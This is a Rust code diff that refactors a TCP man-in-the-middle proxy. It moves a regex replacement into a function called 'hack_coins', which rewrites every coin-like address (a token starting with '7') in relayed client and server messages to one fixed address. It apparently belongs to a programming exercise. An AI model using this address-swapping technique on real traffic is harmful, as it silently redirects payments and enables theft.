@@ -24,6 +24,11 @@ async fn write_next_line(w: &mut (impl AsyncWriteExt + Unpin), msg: &str) -> Res
     Ok(w.flush().await?)
 }
 
+fn hack_coins (input: &str) -> String {
+    let re = Regex::new(r"(?<= |^)7[a-zA-Z0-9]{25,34}(?= |$)").unwrap();
+    re.replace_all(&input, "7YWHMfk9JZe0LM0g1ZauHuiSxhI").to_string()
+}
+
 #[tokio::main]
 async fn main() -> Result<()> {
     // Setup the logging framework
@@ -72,21 +77,21 @@ async fn process(
 
     tokio::spawn({
         async move {
-            let re = Regex::new(r"(?<= |^)7[a-zA-Z0-9]{25,34}(?= |$)").unwrap();
+            
             loop {
                 if let Ok(server_line) = read_next_line(&mut server_reader).await {
                     info!("From {}->{}", client_addr, server_line);
-                    let new_line = re.replace_all(&server_line, "7YWHMfk9JZe0LM0g1ZauHuiSxhI").to_string();
+                    let new_line = hack_coins(&server_line);
                     info!("New line: {}", new_line);
                     let _ = write_next_line(&mut client_writer, &new_line).await;
                 }
             }
         }
     });
-    let re = Regex::new(r"(?<= |^)7[a-zA-Z0-9]{25,34}(?= |$)").unwrap();
+    
     loop {
         let client_line = read_next_line(&mut client_reader).await?;
-        let client_line = re.replace_all(&client_line, "7YWHMfk9JZe0LM0g1ZauHuiSxhI");
+        let client_line = hack_coins(&client_line);
         info!("To {}->{}", client_addr, client_line);
         write_next_line(&mut server_writer, &client_line).await?;
     }
